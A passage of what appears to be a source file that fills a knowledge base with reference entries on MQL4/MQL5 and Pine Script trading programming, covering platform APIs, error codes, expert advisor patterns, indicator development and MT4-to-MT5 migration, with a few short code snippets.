    'MQL5 data management: Built-in SQLite database support — DatabaseOpen(), DatabasePrepare(), DatabaseRead(), DatabaseExecute(), DatabaseBind(), DatabaseFinalize(), DatabaseClose(). File operations: FileOpen(), FileWrite(), FileRead(), FileClose(), FileDelete(). Modes: FILE_READ, FILE_WRITE, FILE_BIN, FILE_CSV, FILE_TXT, FILE_ANSI, FILE_UNICODE, FILE_COMMON. Serialization with StructToCharArray/CharArrayToStruct. WebRequest() for HTTP API calls (REST APIs, webhooks). SocketCreate/SocketConnect for raw TCP connections. GlobalVariable functions for inter-EA communication.', 1.3)

  // ── Trading Programming: TradingView / Pine Script ───────────────────────────

  add('trading_programming', ['pine script', 'tradingview programming', 'pine script indicator', 'tradingview coding'],
    'TradingView Pine Script is a domain-specific language for creating indicators and strategies on TradingView. Current version: Pine Script v5 (with //@version=5). Types: indicator() for studies, strategy() for backtesting. Key features: built-in series types (time-indexed), auto-referencing previous values with [] operator (close[1] = previous close), na handling, conditional coloring, alertcondition() for alerts. Data types: int, float, bool, color, string, line, label, box, table, array, matrix, map. Execution model: script runs once per bar, from left to right across the chart. plot(), plotshape(), plotchar(), plotarrow() for visualization.', 1.5)

  add('trading_programming', ['pine script strategy', 'tradingview strategy', 'pine script backtest', 'tradingview backtesting'],
    'Pine Script strategy development: strategy(title, overlay, default_qty_type, default_qty_value, initial_capital, commission_type, commission_value, slippage). Entry: strategy.entry(id, direction, qty, limit, stop, comment). Exit: strategy.exit(id, from_entry, profit, loss, trail_points, trail_offset), strategy.close(id), strategy.close_all(). Direction: strategy.long, strategy.short. Position sizing: strategy.fixed, strategy.cash, strategy.percent_of_equity. Results: strategy.netprofit, strategy.grossprofit, strategy.grossloss, strategy.max_drawdown, strategy.closedtrades, strategy.wintrades, strategy.losstrades, strategy.equity.', 1.4)

  add('trading_programming', ['pine script built-in functions', 'pine script ta library', 'tradingview technical analysis functions'],
    'Pine Script built-in technical analysis (ta.*): ta.sma(), ta.ema(), ta.wma(), ta.vwma(), ta.rsi(), ta.macd(), ta.bb() (Bollinger Bands), ta.stoch(), ta.atr(), ta.cci(), ta.adx(), ta.supertrend(), ta.pivothigh(), ta.pivotlow(), ta.crossover(), ta.crossunder(), ta.highest(), ta.lowest(), ta.change(), ta.mom(), ta.roc(), ta.tr() (true range), ta.cum(), ta.valuewhen(), ta.barssince(). Math functions: math.abs(), math.round(), math.max(), math.min(), math.log(), math.sqrt(), math.pow(). String functions: str.tostring(), str.format(), str.contains(), str.replace().', 1.4)

  add('trading_programming', ['pine script drawing', 'pine script label', 'pine script line', 'tradingview drawing objects'],
    'Pine Script drawing objects (v5): Lines: line.new(x1,y1,x2,y2), line.set_xy1(), line.set_color(), line.delete(). Labels: label.new(x,y,text), label.set_text(), label.set_color(), label.delete(). Boxes: box.new(left,top,right,bottom), box.set_bgcolor(). Tables: table.new(position, columns, rows), table.cell(). Polylines: polyline.new(points). Colors: color.new(r,g,b,transp), color.rgb(), color.from_gradient(). Positions: position.top_left, position.bottom_right, etc. Use max_lines_count, max_labels_count, max_boxes_count in indicator(). Arrays: array.new<line>(), array.push(), array.pop().', 1.3)

  add('trading_programming', ['pine script alerts', 'tradingview alerts', 'pine script webhook', 'tradingview automation'],
    'Pine Script alerts and automation: alertcondition(condition, title, message) for indicator alerts. Strategy alerts fire on strategy.entry/exit/close. Alert message placeholders: {{ticker}}, {{exchange}}, {{close}}, {{open}}, {{high}}, {{low}}, {{volume}}, {{time}}, {{timenow}}, {{interval}}, {{strategy.order.action}}, {{strategy.order.contracts}}, {{strategy.order.price}}, {{strategy.order.id}}. Webhook integration: set alert notification to Webhook URL with JSON payload for automated trading via third-party services (3Commas, Autoview, TradingConnector, PineConnector). Use input.source() for multi-indicator communication.', 1.3)

  add('trading_programming', ['pine script libraries', 'pine script import', 'tradingview library', 'pine script reusable code'],
    'Pine Script libraries (v5): Create reusable code with library(title, overlay). Export functions with export keyword. Import: import username/libraryName/version as alias. Built-in libraries: ta (technical analysis), math, str, array, matrix, map, chart, timeframe, syminfo. User-defined types (UDT): type MyType with fields. Methods: method myMethod(MyType self) =>. Switch statement: switch/case. For loops: for i = 0 to n, for [i, v] in array. While loops supported. Ternary operator: condition ? true : false. Tuple returns: [val1, val2] = function(). Request functions: request.security(), request.financial(), request.economic(), request.dividends().', 1.3)

  // ── Cross-Platform Trading Concepts ──────────────────────────────────────────

  add('trading_programming', ['algorithmic trading strategy', 'trading algorithm design', 'automated trading system design'],
    'Algorithmic trading strategy design principles: Signal generation (entry/exit rules based on technical indicators, price action, statistical models), risk management (position sizing, stop-loss, take-profit, maximum drawdown limits), execution management (slippage control, order types, partial fills), portfolio management (correlation, diversification, exposure limits). Strategy types: trend following (MA crossover, breakout), mean reversion (Bollinger Bands, RSI oversold/overbought), momentum (ROC, relative strength), statistical arbitrage (pairs trading, cointegration), market making (bid-ask spread capture). Evaluation metrics: Sharpe Ratio, Sortino Ratio, Profit Factor, Maximum Drawdown, Win Rate, Risk-Reward Ratio, Expectancy.', 1.4)

  add('trading_programming', ['trading bot architecture', 'trading system components', 'trading platform comparison mt4 mt5 tradingview'],
    'Trading platform comparison: MT4 — MQL4 (C-like), forex-focused, single-thread EAs, position accounting only, widespread broker support, huge EA marketplace. MT5 — MQL5 (full OOP), multi-asset (forex, stocks, futures), multi-threaded, netting+hedging modes, built-in SQLite, OpenCL GPU support, MQL5 Cloud Network, DOM (Depth of Market). TradingView — Pine Script (cloud-based), best charting, social features, strategy backtesting, alert-based automation via webhooks, cross-broker integration. Common architecture: Data Feed → Signal Engine → Risk Manager → Order Manager → Execution → Logging/Monitoring. All support custom indicators, backtesting, and optimization.', 1.4)

  add('trading_programming', ['candlestick pattern detection', 'price action programming', 'chart pattern recognition code'],
    'Candlestick pattern detection in code: Doji: MathAbs(Open-Close) <= (High-Low)*0.1. Hammer: lower_shadow >= 2*body && upper_shadow <= body*0.3. Engulfing: (Close[1]<Open[1] && Close>Open && Close>Open[1] && Open<Close[1]) for bullish. Morning Star: 3-bar pattern. Pin Bar: tail > 2*body, nose < 0.3*(High-Low). Inside Bar: High<High[1] && Low>Low[1]. Common in all platforms — MQL4: use Open[], Close[], High[], Low[] arrays; MQL5: use CopyRates() and MqlRates structure; Pine Script: use open, close, high, low series with [] operator for lookback. Combine with volume confirmation and support/resistance levels.', 1.3)

  add('trading_programming', ['trading indicator divergence', 'rsi divergence detection', 'macd divergence code'],
    'Divergence detection programming: Regular bullish divergence — price makes lower low but indicator makes higher low (reversal signal). Regular bearish divergence — price makes higher high but indicator makes lower high. Hidden bullish divergence — price makes higher low but indicator makes lower low (continuation). Hidden bearish divergence — price makes lower high but indicator makes higher high. Implementation: 1) Find pivot highs/lows in price using ta.pivothigh()/ta.pivotlow() (Pine) or custom lookback; 2) Find corresponding pivot points in indicator (RSI, MACD, Stochastic); 3) Compare slopes. Useful in MQL4 (iRSI+local extrema), MQL5 (CopyBuffer+pivot logic), Pine Script (ta.rsi+ta.pivotlow).', 1.3)

  add('trading_programming', ['trading risk reward ratio', 'stop loss take profit calculation', 'atr based stop loss'],
    'ATR-based risk management across platforms: ATR (Average True Range) for dynamic stop-loss/take-profit. MT4: double atr = iATR(Symbol(), 0, 14, 0); sl = Ask - atr * 1.5; tp = Ask + atr * 3.0. MT5: int atrHandle = iATR(Symbol(), PERIOD_CURRENT, 14); double atr[]; CopyBuffer(atrHandle, 0, 0, 1, atr); sl = SymbolInfoDouble(Symbol(), SYMBOL_ASK) - atr[0]*1.5. Pine Script: atrValue = ta.atr(14); strategy.exit("TP/SL", stop=close-atrValue*1.5, limit=close+atrValue*3). Risk-reward ratio = (TP distance)/(SL distance). Position size = (Account Risk %) / (SL in pips × pip value). Always normalize lot sizes to broker minimums.', 1.3)


  // ── MT4/MT5 Advanced: Error Codes & Debugging ─────────────────────────────

  add('mql_errors_debugging', ['mql4 error codes', 'mt4 getlasterror', 'mql4 common errors', 'mt4 debugging'],
    'MQL4/MQL5 error codes and debugging: GetLastError() returns last error code. Common MQL4 errors: ERR_NO_ERROR (0), ERR_NO_RESULT (1), ERR_COMMON_ERROR (2), ERR_INVALID_TRADE_PARAMETERS (3), ERR_SERVER_BUSY (4), ERR_OLD_VERSION (5), ERR_NO_CONNECTION (6), ERR_NOT_ENOUGH_RIGHTS (7), ERR_TOO_FREQUENT_REQUESTS (8), ERR_TRADE_TIMEOUT (128), ERR_INVALID_PRICE (129), ERR_INVALID_STOPS (130), ERR_INVALID_TRADE_VOLUME (131), ERR_MARKET_CLOSED (132), ERR_TRADE_DISABLED (133), ERR_NOT_ENOUGH_MONEY (134), ERR_PRICE_CHANGED (135), ERR_OFF_QUOTES (136), ERR_REQUOTE (138), ERR_ORDER_LOCKED (139), ERR_LONG_POSITIONS_ONLY_ALLOWED (140), ERR_TRADE_MODIFY_DENIED (145). Debugging: Print() to Experts log, Comment() on chart, Alert() popup, PlaySound(). ResetLastError() before trade operations. Always log: Print("OrderSend error: ", GetLastError()).', 1.5)

  add('mql_errors_debugging', ['mql5 error handling', 'mt5 trade result code', 'mql5 retcode', 'mt5 error diagnosis'],
    'MQL5 error handling with result codes: MqlTradeResult structure — retcode field: TRADE_RETCODE_DONE (10009), TRADE_RETCODE_PLACED (10008), TRADE_RETCODE_REQUOTE (10004), TRADE_RETCODE_REJECT (10006), TRADE_RETCODE_CANCEL (10007), TRADE_RETCODE_INVALID (10013), TRADE_RETCODE_INVALID_VOLUME (10014), TRADE_RETCODE_INVALID_PRICE (10015), TRADE_RETCODE_INVALID_STOPS (10016), TRADE_RETCODE_TRADE_DISABLED (10017), TRADE_RETCODE_MARKET_CLOSED (10018), TRADE_RETCODE_NO_MONEY (10019), TRADE_RETCODE_PRICE_CHANGED (10020), TRADE_RETCODE_PRICE_OFF (10021), TRADE_RETCODE_INVALID_EXPIRATION (10022), TRADE_RETCODE_ORDER_CHANGED (10023), TRADE_RETCODE_TOO_MANY_REQUESTS (10024). Debug with PrintFormat("Retcode=%u, Deal=%I64u, Order=%I64u", result.retcode, result.deal, result.order). Use _LastError runtime error variable. DebugBreak() for IDE debugger. Comment() and ChartRedraw() for visual debugging.', 1.5)

  add('mql_errors_debugging', ['mql compilation error', 'mql syntax error fix', 'mql build errors', 'metatrader compile fix'],
    'Common MQL4/MQL5 compilation errors and fixes: "\';\' expected" — missing semicolon at end of statement. "undeclared identifier" — variable not declared or misspelled (MQL is case-sensitive: OrderSend not ordersend). "implicit conversion" — type mismatch (use explicit cast: (int)doubleVar, (double)intVar, StringToDouble(), IntegerToString()). "function not defined" — missing function body or wrong signature. "\'}\' expected" — unmatched braces (use editor bracket matching). "array required" — using [] on non-array. "constant expression required" — array size must be constant (use ArrayResize for dynamic). "possible loss of data" — assigning double to int (use (int)MathRound()). "not all control paths return a value" — missing return in some branches. "#include file not found" — wrong path (use <file.mqh> for standard, "file.mqh" for local). Always compile with strict mode: #property strict (MQL4) to catch implicit conversion warnings.', 1.6)

  // ── MT4/MT5 Advanced: EA Development Patterns ────────────────────────────────

  add('ea_development_patterns', ['expert advisor template', 'ea structure pattern', 'mql ea architecture', 'ea development framework'],
    'Expert Advisor development patterns: Basic EA template structure: 1) Input parameters (extern/input), 2) Global variables (handles, magic number), 3) OnInit() — initialization (indicator handles, validation), 4) OnDeinit() — cleanup (release handles, save state), 5) OnTick() — main logic (check conditions, manage trades). State machine pattern: enum EAState { STATE_WAITING, STATE_ENTRY_SIGNAL, STATE_IN_TRADE, STATE_EXIT_SIGNAL }; switch(currentState). Multi-timeframe EA: check higher TF trend in OnInit or with timer, execute on lower TF. Error recovery: retry loops with Sleep() for failed orders. Magic number convention: encode strategy+symbol+timeframe. MQL4 template: input double LotSize=0.01; input int StopLoss=50; input int TakeProfit=100; input int MagicNumber=12345; int OnInit() { return(INIT_SUCCEEDED); } void OnTick() { if(OrdersTotal()==0 && BuySignal()) OrderSend(Symbol(),OP_BUY,LotSize,Ask,3,Ask-StopLoss*Point,Ask+TakeProfit*Point,"EA",MagicNumber,0,clrGreen); }.', 1.5)

  add('ea_development_patterns', ['ea multi timeframe', 'ea state machine', 'ea event driven pattern', 'mql design pattern trading'],
    'Advanced EA patterns: Multi-Timeframe EA — check H4 trend (iMA on PERIOD_H4), entry on M15 signal, exit on M5 confirmation. Use iCustom() or indicator handles per timeframe. State Machine EA: typedef enum { IDLE, LOOKING_FOR_ENTRY, IN_POSITION, TRAILING, CLOSING } TradeState; manage transitions with clear conditions. Event-Driven (MQL5): OnTrade() fires on trade events, OnTradeTransaction() for individual transactions, OnTimer() for periodic checks. Observer pattern: multiple signal modules vote (trend+momentum+volume). Pipeline pattern: Signal→Filter→RiskSize→Execute→Monitor. Composite pattern: manage sub-EAs. Strategy Factory: create strategy variants from parameters. Grid EA pattern: place orders at fixed intervals (grid_step), track grid levels with arrays. Martingale pattern: double lot on loss (high risk — always add max_multiplier limit). Anti-martingale: increase on wins, decrease on losses.', 1.4)

  add('ea_development_patterns', ['ea testing debugging', 'ea journal logging', 'ea error recovery', 'mql robust ea coding'],
    'Robust EA development practices: Logging system — use Print() with timestamps, trade details, error codes; create custom log function: void Log(string msg) { Print(TimeToString(TimeCurrent(),TIME_DATE|TIME_MINUTES)+" "+msg); }. File logging: int fh=FileOpen("EA_Log.csv",FILE_WRITE|FILE_CSV); FileWrite(fh,TimeToString(TimeCurrent()),action,lots,price,sl,tp,GetLastError()); FileClose(fh). Error recovery pattern: int attempts=0; while(attempts<3) { ticket=OrderSend(...); if(ticket>0) break; Sleep(1000); RefreshRates(); attempts++; }. Pre-trade validation: check spread (MarketInfo(Symbol(),MODE_SPREAD) < maxSpread), check trading allowed (IsTradeAllowed(), IsTesting()), check margin (AccountFreeMarginCheck(Symbol(),OP_BUY,lots) > 0). OnTester() for custom optimization criteria: return (win_rate * profit_factor * -max_drawdown_percent). Version tracking: #define EA_VERSION "1.3.2"; Comment(EA_VERSION+" | Trades: "+IntegerToString(tradesCount)).', 1.4)

  // ── MT4/MT5 Advanced: Indicator Development ──────────────────────────────────

  add('advanced_indicator_dev', ['multi timeframe indicator', 'mtf indicator mql', 'arrow indicator mql', 'signal indicator development'],
    'Advanced indicator development: Multi-Timeframe (MTF) Indicator — MQL4: double h4_ma = iMA(Symbol(), PERIOD_H4, 20, 0, MODE_SMA, PRICE_CLOSE, 0); display on current chart with shift calculation. MQL5: int h4Handle = iMA(Symbol(), PERIOD_H4, 20, 0, MODE_SMA, PRICE_CLOSE); CopyBuffer(h4Handle, 0, 0, rates_total, h4Buffer). Arrow/Signal Indicators: use DRAW_ARROW style with SetIndexArrow(buffer, WINGDINGS_CODE); buy signal arrow: code 233 (up arrow), sell signal: code 234 (down arrow). EMPTY_VALUE for no signal: Buffer[i] = (buySignal) ? Low[i] - offset : EMPTY_VALUE. Multi-buffer indicator: #property indicator_buffers 4; buffer0=main line, buffer1=signal line, buffer2=buy arrows, buffer3=sell arrows. Color coding: indicator_color1=clrDodgerBlue. Dashboard indicator: use ObjectCreate() with OBJ_LABEL for text display, OBJ_RECTANGLE_LABEL for panels on chart.', 1.5)

  add('advanced_indicator_dev', ['indicator repainting fix', 'non repainting indicator', 'indicator bar confirmation', 'mql indicator accuracy'],
    'Fixing indicator repainting: An indicator repaints when it changes past signals on completed bars. Common causes: 1) Using bar index 0 (current forming bar) for signals — fix: only signal on bar index 1+ (confirmed bars). 2) Using future data (iHighest/iLowest with wrong shift) — fix: ensure lookback only uses past bars. 3) ZigZag-type indicators inherently repaint. Non-repainting pattern: bool signal = false; if(i >= 1 && Close[i] > iMA(Symbol(),0,20,0,MODE_SMA,PRICE_CLOSE,i) && Close[i+1] <= iMA(Symbol(),0,20,0,MODE_SMA,PRICE_CLOSE,i+1)) signal = true; — only checks completed bars [i] and [i+1]. Confirmation approach: wait for bar close using static datetime: static datetime lastBar=0; if(Time[0]!=lastBar) { lastBar=Time[0]; /* process previous bar */ }. In backtesting, always use "Open Prices Only" mode to verify non-repainting behavior. Alert only on new bar formation, not on every tick.', 1.5)

  add('advanced_indicator_dev', ['indicator overlay separate window', 'histogram indicator', 'channel indicator', 'band indicator mql'],
    'Indicator display types: Chart overlay (#property indicator_chart_window): moving averages, Bollinger Bands, pivot levels, trendlines, support/resistance zones. Use SetLevelValue()/SetLevelStyle() for horizontal levels. Separate window (#property indicator_separate_window): RSI, MACD, Stochastic, custom oscillators. Set min/max: #property indicator_minimum 0; #property indicator_maximum 100. Level lines: #property indicator_level1 70; #property indicator_level2 30. Histogram: DRAW_HISTOGRAM (from zero line), DRAW_HISTOGRAM2 (between two buffers — great for MACD histogram). Channel/Band indicators: DRAW_FILLING fills between two buffers (Bollinger Band fill). Color line: DRAW_COLOR_LINE with PlotIndexSetInteger(0,PLOT_COLOR_INDEXES,3) and separate color buffer. Candle overlay: DRAW_CANDLES to repaint candles with custom colors (Heiken Ashi). MQL5 extra: DRAW_BARS, DRAW_ZIGZAG, DRAW_COLOR_CANDLES, DRAW_COLOR_HISTOGRAM2.', 1.4)

  // ── MT4/MT5 Advanced: Code Optimization ──────────────────────────────────────

  add('mql_code_optimization', ['mql performance optimization', 'mql speed fast code', 'mql memory management', 'ea optimization speed'],
    'MQL code optimization techniques: Avoid calling indicator functions every tick — cache values: static double prevMA=0; static datetime prevTime=0; if(Time[0]!=prevTime) { prevMA=iMA(...); prevTime=Time[0]; }. Minimize OrdersTotal() loops: iterate once, store needed data in arrays. Use ArrayResize with reserve parameter: ArrayResize(arr, newSize, 1000) — pre-allocates memory. String concatenation is slow — use StringConcatenate() or StringFormat() instead of +. Avoid Print() in production (slow I/O) — use #ifdef _DEBUG. MQL5: release indicator handles in OnDeinit: IndicatorRelease(handle). Use ArraySetAsSeries() before CopyBuffer for proper indexing. For large arrays, use ArraySort() (built-in quicksort). Avoid GlobalVariableSet/Get in tight loops — use static variables instead. Timer-based processing: OnTimer() at intervals vs OnTick() every tick for non-critical tasks. Profile code: uint start=GetTickCount(); /* code */; Print("Time: "+(GetTickCount()-start)+"ms");', 1.4)

  add('mql_code_optimization', ['mql array handling', 'mql string operations', 'mql efficient loop', 'mql data structure optimization'],
    'MQL efficient data handling: Array best practices — always iterate backwards when deleting orders: for(int i=OrdersTotal()-1; i>=0; i--) to avoid index shifting. Use ArraySetAsSeries(buffer, true) to index newest as [0]. Dynamic arrays: ArrayResize() with reserve. Fixed arrays: int arr[100]; (stack allocated, faster). Struct arrays for complex data: struct TradeInfo { int ticket; double lots; double profit; }; TradeInfo trades[]; MQL5 collections: CArrayObj, CList, CDictionary from Standard Library. String efficiency: avoid string comparison in loops — convert to hash/enum. Use StringFind() instead of regex (MQL has no regex). Number formatting: DoubleToString(price, _Digits) or NormalizeDouble(price, _Digits). Bitwise flags for compact state: #define FLAG_BUY 1; #define FLAG_SELL 2; #define FLAG_PENDING 4; int state = FLAG_BUY | FLAG_PENDING. Memory: MQL auto-manages memory but use delete for new-allocated objects in MQL5 classes.', 1.3)

  add('mql_code_optimization', ['mql preprocessor', 'mql conditional compilation', 'mql include organize', 'mql code organization'],
    'MQL code organization and preprocessor: Conditional compilation: #ifdef __MQL5__ /* MQL5 code */ #else /* MQL4 code */ #endif — write cross-platform code. Debug mode: #define DEBUG; #ifdef DEBUG Print("Debug: "+msg); #endif. Constants: #define MAGIC_NUMBER 12345; #define MAX_TRADES 10; #define EA_NAME "MyEA v1.0". Include organization: #include <Trade/Trade.mqh> (standard library), #include "MyLibrary.mqh" (local). File structure: /Include/ for shared libraries, /Experts/ for EAs, /Indicators/ for indicators, /Scripts/ for one-shot scripts. Namespace emulation: prefix functions (MyEA_CalculateLots, MyEA_CheckSignal). MQL5 namespaces (limited): use classes as namespaces. Property directives: #property copyright "Author"; #property version "1.0"; #property description "EA description"; #property strict (MQL4 — enables strict compilation, catches more bugs). Input grouping (MQL5): sinput string InpGroup1="=== Trade Settings ==="; groups inputs visually in settings dialog.', 1.3)

  // ── MT4/MT5 Advanced: Migration MT4→MT5 ──────────────────────────────────────

  add('mt4_mt5_migration', ['mt4 to mt5 conversion', 'mql4 to mql5 migration', 'convert ea mt4 mt5', 'mt4 mt5 differences code'],
    'MT4 to MT5 migration guide: Key API changes — Orders: OrderSend()→CTrade.Buy()/Sell(), OrderModify()→trade.PositionModify(), OrderClose()→trade.PositionClose(), OrderDelete()→trade.OrderDelete(). Data access: predefined arrays (Open[], Close[], High[], Low[])→CopyRates()/CopyOpen()/CopyClose() with MqlRates structure. Indicators: iMA(Symbol(),0,period,0,MODE_SMA,PRICE_CLOSE,shift)→int handle=iMA(Symbol(),PERIOD_CURRENT,period,0,MODE_SMA,PRICE_CLOSE); double buf[]; CopyBuffer(handle,0,shift,1,buf). Order accounting: MT4 position-based→MT5 netting (default) or hedging mode. OrdersTotal()→PositionsTotal() for open positions + OrdersTotal() for pending. Magic number: always use to identify EA trades in both platforms. Symbol properties: MarketInfo(Symbol(),MODE_POINT)→SymbolInfoDouble(Symbol(),SYMBOL_POINT). Tester: single-currency→multi-currency/multi-timeframe testing.', 1.5)

  add('mt4_mt5_migration', ['mql4 mql5 api differences', 'mt4 mt5 function mapping', 'mql4 deprecated functions', 'metatrader migration pitfalls'],
    'MQL4→MQL5 function mapping: Account: AccountBalance()→AccountInfoDouble(ACCOUNT_BALANCE), AccountEquity()→AccountInfoDouble(ACCOUNT_EQUITY), AccountFreeMargin()→AccountInfoDouble(ACCOUNT_MARGIN_FREE). Symbol: MarketInfo(s,MODE_BID)→SymbolInfoDouble(s,SYMBOL_BID), MarketInfo(s,MODE_SPREAD)→(int)SymbolInfoInteger(s,SYMBOL_SPREAD). Time: iTime(s,tf,i)→CopyTime, iOpen/iClose/iHigh/iLow→CopyOpen/CopyClose/CopyHigh/CopyLow. Volume: iVolume→CopyTickVolume. Common pitfalls: 1) Array indexing reversed (MQL5 newest is last index by default — use ArraySetAsSeries). 2) No predefined Bid/Ask variables in MQL5 — use SymbolInfoDouble or SymbolInfoTick. 3) Indicator buffers allocated differently. 4) OnCalculate() signature different. 5) No OrderMagicNumber() per order in MT5 pending — use ORDER_MAGIC via OrderGetInteger. 6) Trade context busy: Sleep()+retry needed in MQL4, asynchronous in MQL5.', 1.4)

  add('mt4_mt5_migration', ['cross platform mql library', 'mql4 mql5 compatible code', 'metatrader universal ea', 'mql wrapper cross compile'],
    'Writing cross-platform MQL4/MQL5 code: Use preprocessor directives: #ifdef __MQL5__ for platform-specific code blocks. Create wrapper functions: double GetBid() { #ifdef __MQL5__ return SymbolInfoDouble(Symbol(),SYMBOL_BID); #else return Bid; #endif }. Universal order function: int MyOrderSend(int type, double lots, double price, double sl, double tp) { #ifdef __MQL5__ CTrade trade; trade.SetExpertMagicNumber(MAGIC); if(type==0) trade.Buy(lots,Symbol(),price,sl,tp); return (int)trade.ResultOrder(); #else return OrderSend(Symbol(),type,lots,price,3,sl,tp,"",MAGIC); #endif }. Shared include file pattern: create "CrossPlatform.mqh" with all wrappers. Universal indicator access: wrap iMA/CopyBuffer behind common interface. This approach allows maintaining a single codebase that compiles on both MT4 and MT5 with minimal changes.', 1.4)

  // ── MT4/MT5 Advanced: Advanced EA Features ───────────────────────────────────

  add('advanced_ea_features', ['trailing stop mql', 'breakeven stop loss', 'partial close order', 'mql trailing stop code'],
    'Advanced EA trade management: Trailing Stop — MQL4: void TrailStop(int ticket, int trailPips) { OrderSelect(ticket,SELECT_BY_TICKET); if(OrderType()==OP_BUY && Bid-OrderOpenPrice()>trailPips*Point) { double newSL=Bid-trailPips*Point; if(newSL>OrderStopLoss()) OrderModify(ticket,OrderOpenPrice(),newSL,OrderTakeProfit(),0); } }. Breakeven: move SL to entry price + small offset after reaching X pips in profit. MQL4: if(Bid-OrderOpenPrice()>=breakevenTrigger*Point) OrderModify(ticket,OrderOpenPrice(),OrderOpenPrice()+breakevenOffset*Point,OrderTakeProfit(),0). Partial close: close portion of position — MQL4: OrderClose(ticket, OrderLots()*0.5, Bid, 3) closes half. MQL5: trade.PositionClosePartial(ticket, volume*0.5). Step trailing: move SL in steps (every N pips). ATR trailing: SL = Bid - ATR*multiplier, updated when price moves favorably. Chandelier exit: highest high minus ATR multiplied by factor.', 1.5)

  add('advanced_ea_features', ['news filter ea', 'session filter trading', 'spread filter mql', 'time filter expert advisor'],
    'EA filtering features: News Filter — avoid trading around high-impact news events. Implementation: download news calendar (WebRequest or file), parse dates/times, pause trading N minutes before/after events. Simple time-based: input string NoTradeTime1="14:30"; input string NoTradeTime2="15:00"; bool IsNewsTime() { datetime now=TimeCurrent(); /* compare */}. Session Filter: only trade during specific sessions — London (08:00-17:00 GMT), New York (13:00-22:00 GMT), Asian (00:00-09:00 GMT). Code: input int SessionStartHour=8; input int SessionEndHour=17; bool InSession() { int hour=TimeHour(TimeCurrent()); return (hour>=SessionStartHour && hour<SessionEndHour); }. Spread Filter: if(MarketInfo(Symbol(),MODE_SPREAD) > MaxSpread) return; — skip trading during wide spreads. Day filter: input bool TradeMonday=true; input bool TradeFriday=false; check DayOfWeek(). Maximum daily trades limit. Maximum daily loss limit: track daily P&L, stop if exceeded.', 1.4)

  add('advanced_ea_features', ['ea dashboard panel', 'ea chart display', 'mql graphical interface', 'ea hud information panel'],
    'EA dashboard/HUD development: Create information panels on charts using MQL objects. Panel creation: ObjectCreate(0,"Panel_BG",OBJ_RECTANGLE_LABEL,0,0,0); ObjectSetInteger(0,"Panel_BG",OBJPROP_XDISTANCE,10); ObjectSetInteger(0,"Panel_BG",OBJPROP_YDISTANCE,30); ObjectSetInteger(0,"Panel_BG",OBJPROP_XSIZE,250); ObjectSetInteger(0,"Panel_BG",OBJPROP_YSIZE,200); ObjectSetInteger(0,"Panel_BG",OBJPROP_BGCOLOR,clrDarkSlateGray). Text labels: ObjectCreate(0,"Label_Balance",OBJ_LABEL,0,0,0); ObjectSetString(0,"Label_Balance",OBJPROP_TEXT,"Balance: $"+DoubleToString(AccountBalance(),2)). Update in OnTick(): ObjectSetString(0,"Label_PnL",OBJPROP_TEXT,"P/L: $"+DoubleToString(currentProfit,2)). Display: open trades, total profit, drawdown %, spread, signal status, account info. MQL5 enhanced: use CAppDialog from <Controls/Dialog.mqh>, CLabel, CButton, CEdit for interactive panels. Cleanup in OnDeinit(): ObjectsDeleteAll(0,"Panel_"); to remove all panel objects.', 1.4)

  // ── MT4/MT5 Advanced: Syntax & Common Mistakes ───────────────────────────────

  add('mql_syntax_mistakes', ['mql common mistakes', 'mql beginner errors', 'mql coding pitfalls', 'expert advisor common bugs'],
    'Common MQL coding mistakes and fixes: 1) Not checking OrderSend return value — always: int ticket=OrderSend(...); if(ticket<0) Print("Error: ",GetLastError()). 2) Wrong Point multiplication for 5-digit brokers — use: double pip = (Digits==3||Digits==5) ? Point*10 : Point. 3) Comparing doubles directly — wrong: if(price==1.2345); right: if(MathAbs(price-1.2345)<Point/2). 4) Not refreshing rates — call RefreshRates() before Bid/Ask in MQL4. 5) Modifying SL/TP too close to price — check MODE_STOPLEVEL: double minStop=MarketInfo(Symbol(),MODE_STOPLEVEL)*Point. 6) Not handling broker limitations — IsTradeAllowed(), IsConnected(), IsExpertEnabled(). 7) Using global arrays without proper sizing — ArrayResize() before use. 8) Magic number collision between EAs — use unique magic per EA+symbol. 9) Not normalizing prices — NormalizeDouble(price, Digits). 10) Forgetting to close file handles — always FileClose(handle).', 1.6)

  add('mql_syntax_mistakes', ['mql4 type conversion error', 'mql5 variable scope error', 'mql array out of range fix', 'mql string error metatrader fix'],
    'MQL type and variable errors: Type conversion — implicit conversion warnings: int to double (safe), double to int (data loss, use (int)MathRound()), string to number (StringToDouble(), StringToInteger()), number to string (DoubleToString(), IntegerToString()). datetime conversion: StringToTime("2024.01.15 10:30"), TimeToString(TimeCurrent()). Color: StringToColor(), ColorToString(). Variable scope: variables declared in if/for blocks only visible inside that block. Static variables: persist between function calls (static int count=0;). Global vs local: global variables (file scope) accessible everywhere, local only in function. extern (MQL4) / input (both): user-configurable parameters. MQL5: sinput = non-optimizable input. Array errors: "array out of range" — check ArraySize() before access. Dynamic vs static arrays: int arr[] (dynamic, needs ArrayResize), int arr[10] (static). String errors: StringLen() returns 0 for NULL — check before SubString.', 1.4)

  add('mql_syntax_mistakes', ['mql trade context busy', 'mql requote handling', 'mql slippage handling', 'mql broker error handling'],
    'MQL broker/trade error handling: Trade Context Busy (Error 146) — another EA is trading. Fix: while(IsTradeContextBusy()) Sleep(100); or use mutex with GlobalVariableSetOnCondition(). Requotes (Error 138): prices changed during order. Fix: refresh and retry: RefreshRates(); retries++; if(retries>maxRetries) break;. Slippage: OrderSend slippage parameter in points (not pips). For 5-digit: slippage=30 means 3 pips. Invalid Stops (Error 130): SL/TP too close to market. Fix: double minDist=MarketInfo(Symbol(),MODE_STOPLEVEL)*Point; if(sl!=0 && MathAbs(price-sl)<minDist) sl = price - minDist. Not Enough Money (Error 134): lot size too large. Fix: reduce lots or use AccountFreeMarginCheck(). Market Closed (Error 132): check IsTradeAllowed(Symbol(),TimeCurrent()). MQL5 equivalent: check SYMBOL_TRADE_MODE via SymbolInfoInteger(). Connection recovery: while(!IsConnected()) { Print("Waiting for connection..."); Sleep(5000); }. Always implement retry logic with exponential backoff: Sleep(1000 * MathPow(2, attempt));.', 1.5)

  // ── MT4/MT5 Advanced: Trading Code Templates ─────────────────────────────────

  add('trading_code_templates', ['ea template mql4', 'expert advisor boilerplate', 'mql4 ea starter template', 'basic ea template code'],
